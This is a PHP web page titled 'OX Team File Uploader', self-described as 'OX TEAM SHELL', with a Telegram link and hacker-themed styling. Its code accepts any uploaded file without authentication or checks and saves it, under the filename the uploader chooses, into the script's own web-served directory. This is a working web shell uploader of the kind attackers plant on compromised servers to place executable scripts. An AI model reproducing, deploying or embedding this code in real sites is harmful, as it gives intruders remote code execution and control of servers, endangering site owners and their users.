<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $uploadDirectory = __DIR__ . '/';
    $filePath = $uploadDirectory . basename($_FILES['file']['name']);
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
        $message = "File uploaded successfully.";
    } else {
        $message = "File upload failed.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OX Team File Uploader</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .header {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            padding: 10px 20px;
            background-color: #111;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        .header .logo {
            margin-right: 20px;
        }
        .header .logo img {
            max-width: 50px;
        }
        .header .ox-team-info {
            font-size: 18px;
        }
        .header .ox-team-info a {
            color: #0f0;
            text-decoration: none;
            font-size: 18px;
        }
        .container {
            background-color: #111;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            text-align: center;
            width: 80%;
            max-width: 400px;
        }
        h1 {
            margin-bottom: 20px;
        }
        input[type="file"] {
            display: none;
        }
        label {
            background-color: #0f0;
            color: black;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        label:hover {
            background-color: #0b0;
        }
        .message {
            margin-top: 20px;
            font-size: 16px;
            color: green;
        }
        button {
            background-color: #0f0;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0b0;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <a href="https://i.ibb.co/RbrW72w/ox.webp">
                <img src="https://i.ibb.co/RbrW72w/ox.webp" alt="OX Team Logo">
            </a>
        </div>
        <div class="ox-team-info">
            <strong>OX TEAM SHELL</strong>
            <p><a href="https://t.me/opxsteam">telegram.me/opxsteam</a></p>
        </div>
    </div>

    <div class="container">
        <h1>Upload a File</h1>
        <form method="post" enctype="multipart/form-data">
            <label for="file">Choose File</label>
            <input type="file" name="file" id="file">
            <button type="submit">Upload</button>
        </form>
        <?php if (isset($message)): ?>
            <div class="message"><?php echo $message; ?></div>
        <?php endif; ?>
    </div>
</body>
</html>
